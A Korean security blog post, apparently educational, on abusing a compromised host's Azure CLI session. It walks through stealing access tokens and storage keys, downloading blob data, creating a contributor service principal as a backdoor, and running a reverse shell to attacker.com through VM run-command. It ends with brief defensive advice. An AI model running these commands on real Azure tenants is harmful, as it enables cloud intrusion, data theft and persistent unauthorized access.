---
layout: post
title: "Azure CLI 명령어 공부: 클라우드 정찰 및 공격"
date: 2025-09-18 17:00:00 +0900
categories: [system-hacking]
tags: [Azure CLI, Cloud Hacking, Reconnaissance, Lateral Movement]
description: "공격자 관점에서의 Azure CLI 활용: 리소스 정찰, 데이터 유출, 그리고 백도어 계정 생성"
---

## 1. 개요

**Azure CLI**는 Azure 리소스를 관리하기 위한 명령줄 도구입니다.
하지만 공격자가 침해한 시스템에 Azure CLI가 설치되어 있고 로그인 세션(`~/.azure/accessTokens.json`)이 남아있다면, 이는 클라우드 인프라 전체를 장악할 수 있는 치명적인 도구가 됩니다.

---

## 2. 공격 시나리오 1: 정찰 및 데이터 유출

공격자는 먼저 현재 계정의 권한과 사용 가능한 리소스를 파악합니다.

### 2.1. 계정 정보 확인
```bash
az account show
az account get-access-token
```
현재 로그인된 구독(Subscription) 정보와 JWT 액세스 토큰을 확인합니다. 이 토큰을 탈취하면 다른 도구에서도 사용할 수 있습니다.

### 2.2. 리소스 탐색
```bash
# 모든 리소스 그룹 나열
az group list --output table

# 실행 중인 가상 머신(VM) 목록 및 IP 확인
az vm list -d --output table
```

### 2.3. 스토리지 데이터 유출
스토리지 계정의 키를 확보하고 데이터를 다운로드합니다.
```bash
# 스토리지 계정 키 나열
az storage account keys list -g MyResourceGroup -n MyStorageAccount

# Blob 컨테이너의 모든 파일 다운로드
az storage blob download-batch -d . -s MyContainer --account-name MyStorageAccount --account-key [Key]
```

   ![AzureCLI_VM](/assets/images/system-hacking/AzureCLI_VM.png)

---

## 3. 공격 시나리오 2: 지속성 유지 (Backdoor)

공격자는 나중에 다시 접근하기 위해 백도어 계정을 생성하거나 권한을 상승시킬 수 있습니다.

### 3.1. 서비스 주체(Service Principal) 생성
서비스 주체는 자동화된 작업에 사용되는 ID이지만, 공격자에게는 완벽한 백도어 역할을 합니다.
```bash
az ad sp create-for-rbac --name "BackupAdmin" --role contributor
```
이 명령은 `appId`, `password`, `tenant` 정보를 반환합니다. 공격자는 이 정보만 있으면 언제 어디서든 Azure에 로그인할 수 있습니다.
```bash
# 백도어로 로그인
az login --service-principal -u [appId] -p [password] --tenant [tenant]
```

### 3.2. VM 명령 실행 (Run Command)
VM에 직접 접속하지 않고도 명령을 실행하여 리버스 쉘을 맺을 수 있습니다.
```bash
az vm run-command invoke -g MyGroup -n MyVM --command-id RunShellScript --scripts "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
```

---

## 4. 방어 대책

1.  **Cloud Shell 제한**: 프로덕션 서버에는 불필요하게 Azure CLI를 설치하지 않습니다.
2.  **RBAC (역할 기반 접근 제어)**: 사용자에게 `Owner`나 `Contributor` 같은 과도한 권한을 주지 말고, 필요한 리소스에만 접근 가능한 최소 권한을 부여합니다.
3.  **조건부 액세스 (Conditional Access)**: 특정 위치(사내망)나 관리되는 기기에서만 Azure 관리에 접근할 수 있도록 정책을 설정합니다.
4.  **로그 모니터링**: `Azure Activity Log`를 모니터링하여 비정상적인 `az` 명령어 실행이나 새로운 서비스 주체 생성을 탐지합니다.

<hr class="short-rule">